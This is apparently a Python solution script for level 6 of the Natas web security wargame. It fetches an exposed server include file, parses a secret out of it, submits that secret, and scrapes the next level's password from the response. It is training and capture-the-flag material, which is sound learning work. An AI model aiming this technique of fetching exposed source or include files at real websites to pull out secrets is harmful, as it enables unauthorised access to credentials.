from config import password_length
from utils import get_level_url, get_request_object, store_secret_and_print_message

level_number = 6


def get_secret():
    req = get_request_object(level_number)
    result = req.get(get_level_url(level_number) + "/includes/secret.inc")
    text = result.text
    search = "$secret = "

    if search in text:
        start_index = text.find(search) + len(search) + 1
        end_index = text.rfind("\"")
        code = text[start_index: end_index]
        result = req.post(get_level_url(level_number), data={"secret": code, "submit": "1"})
        text = result.text
        search = "The password for natas7 is"

        if search in text:
            start_index = text.find(search) + len(search) + 1
            return text[start_index: start_index + password_length]

    return ""


secret = get_secret()
store_secret_and_print_message(level_number, secret)
